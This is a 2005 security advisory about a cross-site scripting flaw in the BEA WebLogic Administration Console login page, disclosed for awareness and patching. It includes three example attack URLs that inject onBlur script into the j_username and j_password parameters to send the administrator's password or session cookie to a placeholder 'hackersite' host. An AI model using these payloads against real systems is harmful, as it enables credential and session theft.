BEA WebLogic Administration Console login page cross-site scripting
vulnerability

AppSecInc Team SHATTER Security Advisory BEA05-V0101
http://www.appsecinc.com/resources/alerts/general/BEA-002.html
May 27, 2005

Affected versions: BEA WebLogic Server 7.0 and 8.1

Risk level: High

Credits: This vulnerability was discovered and researched by Agustín
Martínez Fayó of Argeniss for Application Security Inc.

Background:
The Administration Console is a web browser-based, graphical user
interface used to manage a WebLogic Server domain. The Administration
Console supports a full range of product administrative tasks. A
cross-site scripting vulnerability exists in the login page of the
Console.

Details:
Cross-site scripting vulnerabilities occur when an attacker tricks a
legitimate web application into sending malicious code, generally in
the form of a script, to an unsuspecting end user. The attack usually
involves crafting a hyperlink with malicious script code embedded
within it. A valid user is likely to click this link since it points
to a resource on a trusted domain. The link can be posted on a web
page, or sent in an instant message, or email. Clicking on the link
executes the attacker-injected code in the context of the trusted web
application. Typically, the code steals session cookies, which can
then be used to impersonate a valid user.

The "j_username" and "j_password" parameters in the login page of the
Administration Console are vulnerable to cross-site scripting attacks.
User supplied input to these parameters is returned without proper
sanitization, allowing a malicious attacker to inject arbitrary
scripting code.

Below are some examples of the hyperlinks an attacker could use.

Steal administrator's password:
http://vulnerablesite:7001/console/login/LoginForm.jsp?j_password=""onBlur="window.open('http://hackersite/'%2Bdocument.all.j_password.value)"
Get the session cookie :
http://vulnerablesite:7001/console/login/LoginForm.jsp?j_username=""onBlur="window.open('http://hackersite/'%2Bdocument.cookie)"
or
http://vulnerablesite:7001/console/login/LoginForm.jsp?j_password=""onBlur="window.open('http://hackersite/'%2Bdocument.cookie)"

Impact:
Attackers can steal administrator's session cookies and password,
thereby allowing the attacker to impersonate the valid user.


Workaround:
There is no workaround for this issue.

Vendor Status:
Vendor was contacted and a patch was released.

Fix:
